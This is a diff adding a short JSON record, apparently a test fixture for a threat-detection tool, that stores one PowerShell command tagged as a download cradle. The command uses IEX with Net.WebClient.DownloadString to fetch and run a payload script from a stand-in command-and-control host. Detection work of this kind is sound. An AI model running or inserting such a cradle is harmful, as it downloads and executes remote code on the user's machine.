@@ -1,0 +1,9 @@
+{
+  "evidence_db": null,
+  "fact": {
+    "fact_type": "powershell_command_fact",
+    "type": "powershell_command_fact",
+    "command": "IEX (New-Object Net.WebClient).DownloadString('http://staging-host.example-c2.net/payload.ps1')",
+    "ttp_tags": ["download_cradle"]
+  }
+}
